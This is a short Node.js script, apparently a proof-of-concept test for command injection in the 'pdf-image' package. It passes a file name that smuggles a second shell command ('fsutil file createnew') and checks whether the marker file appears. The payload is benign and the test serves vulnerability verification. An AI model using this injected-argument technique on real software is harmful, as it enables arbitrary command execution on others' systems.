var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var PDFImage = require('pdf-image').PDFImage;
const fs = require('fs');
const path = './pdf-image_2';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log('{ true, true }');
try {
    let pdfImage = new PDFImage('" & fsutil file createnew pdf-image_2 0');
    let x = pdfImage.getInfo().finally(() => {
        file_exist = fs.existsSync(path);
        console.log('foo');
        console.log('{ ' + file_exist + ', ' + true + ' }');
        fs.unlink(path, function (err) {
        });
    });
} catch (error) {
}